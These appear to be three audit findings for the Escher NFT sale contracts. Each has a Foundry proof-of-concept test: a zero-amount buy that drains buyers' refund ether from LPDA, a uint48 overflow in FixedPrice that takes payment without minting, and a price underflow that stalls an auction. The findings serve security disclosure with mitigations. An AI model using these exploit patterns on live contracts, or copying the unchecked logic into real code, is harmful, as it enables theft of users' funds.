# Vulnerability details

## Impact
The buy function in LPDA.sol can be called after the sale is over since it does not check that _amount > 0. 
This means that [LPDA.sol#L81-L88](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L81-L88) can be invoked more than once by the seller (or anybody as a matter of fact), allowing them to draining the funds from the contract.
If this happens, there won't be enough balance to refund the buyers who overpaid.

## Proof of Concept
Run the following test. 
```
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {EscherTest} from "./utils/EscherTest.sol";
import {LPDAFactory, LPDA} from "src/minters/LPDAFactory.sol";

contract LPDAVuln1Base is EscherTest {
    LPDAFactory public lpdaSales;
    LPDA.Sale public lpdaSale;

    function setUp() public virtual override {
        super.setUp();
        lpdaSales = new LPDAFactory();
        // set up a LPDA Sale
        lpdaSale = LPDA.Sale({
            currentId: uint48(0),
            finalId: uint48(2),
            edition: address(edition),
            startPrice: uint80(uint256(1 ether)),
            finalPrice: uint80(uint256(0.1 ether)),
            dropPerSecond: uint80(uint256(0.1 ether) / 1 days),
            startTime: uint96(block.timestamp),
            saleReceiver: payable(address(69)),
            endTime: uint96(block.timestamp + 9 days)
        });
    }
}


contract LPDAVuln1Test is LPDAVuln1Base {
    LPDA public sale;

    function test_LPDA() public {
        // make the lpda sales contract
        sale = LPDA(lpdaSales.createLPDASale(lpdaSale));
        // authorize the lpda sale to mint tokens
        edition.grantRole(edition.MINTER_ROLE(), address(sale));

        // Address 69: seller, this: buyer 1, 70: buyer 2

        // buyer 1 buys
        sale.buy{value: 1 ether}(1);
        assertEq(address(sale).balance, 1 ether);

        vm.warp(block.timestamp + 5 days);
        assertApproxEqRel(sale.getPrice(), 0.5 ether, lpdaSale.dropPerSecond);

        // buyer 2 buys 5 days later
        vm.prank(address(70));
        vm.deal(address(70), 0.6 ether);
        sale.buy{value: 0.6 ether}(1);

        // sale ends, seller gets revenue
        assertApproxEqRel(address(69).balance, 0.95 ether, lpdaSale.dropPerSecond);

        // but seller can drain all the ether from the contract by calling buy with amount = 0
        // msg.value is set to ensure that there's enough ether in the contract
        vm.prank(address(69));
        sale.buy{value: 0.5 ether}(0);

        // seller gets an additional 0.45 ether of revenue, which he is not supposed to get
        assertApproxEqRel(address(69).balance, 1.40 ether, lpdaSale.dropPerSecond);
        assertApproxEqRel(address(sale).balance, 0.1 ether, lpdaSale.dropPerSecond);

        // now the buyers can't get their refunds
        vm.expectRevert();
        vm.prank(address(this));
        sale.refund();
    }
}
```

## Tools Used
VSCode, Foundry

## Recommended Mitigation Steps
In the buy() function, check that _amount is greater than 0.
` require(_amount > 0, "AMOUNT CANT BE 0")`

# Lines of code

https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L62


# Vulnerability details

## Impact
Due to an integer overflow, a user may not buy anything and lose tokens.

## Proof of Concept
The following proof of concept wants to demonstrate that if someone buys into the `FixedPrice` contract `(281474976710655) + 1` amount with 1 price, it should cost `281474976710656` but instead of this, the user will lose all tokens without minting anything.

The problem resides in `uint48 newId = uint48(_amount) + sale_.currentId;` where an unsafe cast is done.

```js
contract POCTest is EscherTest {
    FixedPrice public sale;
    FixedPrice.Sale public fixedSale;
    FixedPriceFactory public fixedSales;

    function setUp() public virtual override {
        super.setUp();
        fixedSales = new FixedPriceFactory();
        fixedSale = FixedPrice.Sale({
            currentId: uint48(1),
            finalId: uint48(10),
            edition: address(edition),
            price: 1,  // <- PRICE 1
            saleReceiver: payable(address(69)),
            startTime: uint96(block.timestamp)
        });
    }

    function test_POC() public {
        sale = FixedPrice(fixedSales.createFixedSale(fixedSale));
        edition.grantRole(edition.MINTER_ROLE(), address(sale));

        (uint48 currentId, uint48 finalId, address edition, uint96 price, address payable saleReceiver, uint96 startTime) = sale.sale();
        assertEq(currentId, 1);
        assertEq(address(sale).balance, 0);

        uint256 value = (281474976710655) + 1;
        sale.buy{value: value}(value);     // Amount overflow
        assertEq(address(sale).balance, value);
        (currentId, finalId, edition, price, saleReceiver, startTime) = sale.sale();
        assertEq(currentId, 1); // <- Nothing was bought
    }
}
```

## Affected source code

- [FixedPrice.sol:62](https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L62)

## Recommended Mitigation Steps
- Use a [safeCast](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) from Open Zeppelin.

# Lines of code

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L124


# Vulnerability details

## Impact
In LPDA, price is calculated as: `price = sale.startPrice - (sale.dropPerSecond * timeElapsed)`. if `sale.dropPerSecond > sale.startPrice/(sale.endTime - sale.startTime)`, the `price` will drop to negative before `sale.endTime` arrives. If the amount of sold items has not reached the amount of auction items before `sale.price` drops to negative, the auction will fail and will never end. This is because when calculating the `sale.price`, it will underflow, leading to transaction revert.

## Proof of Concept
In the below test case, the 2nd purchase will revert since the `sale.price` has dropped to negative value at this time.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {EscherTest} from "./utils/EscherTest.sol";
import {LPDAFactory, LPDA} from "src/minters/LPDAFactory.sol";

contract LPDAPriceDropTooFastBase is EscherTest {
    LPDAFactory public lpdaSales;
    LPDA.Sale public lpdaSale;

    function setUp() public virtual override {
        super.setUp();
        lpdaSales = new LPDAFactory();
        // set up a LPDA Sale
        lpdaSale = LPDA.Sale({
            currentId: uint48(0),
            finalId: uint48(10),
            edition: address(edition),
            startPrice: uint80(uint256(1 ether)),
            finalPrice: uint80(uint256(0.1 ether)),
            dropPerSecond: uint80(uint256(1 ether) / 10 hours),
            startTime: uint96(block.timestamp),
            saleReceiver: payable(address(69)),
            endTime: uint96(block.timestamp + 1 days)
        });
    }
}

contract LPDAPriceDropTooFastTest is LPDAPriceDropTooFastBase {
    LPDA public sale;

    function test_PriceDropTooFast_LPDA() public {
        // make the lpda sales contract
        sale = LPDA(lpdaSales.createLPDASale(lpdaSale));
        // authorize the lpda sale to mint tokens
        edition.grantRole(edition.MINTER_ROLE(), address(sale));
        // 1st buy success
        sale.buy{value: 1 ether}(1);
        assertEq(address(sale).balance, 1 ether);

        vm.warp(block.timestamp + 12 hours);

        vm.expectRevert();

        // 2nd purchase revert due to sale.price underflow
        sale.buy{value: uint256((1 ether) * 8)}(8);
    }
}
```


## Tools Used
Manual audit.

## Recommended Mitigation Steps
Add prameter verification to make sure `sale.price > 0` at `sale.endTime`, i.e. to make sure `sale.dropPerSecond < sale.startPrice/(sale.endTime - sale.startTime)`.

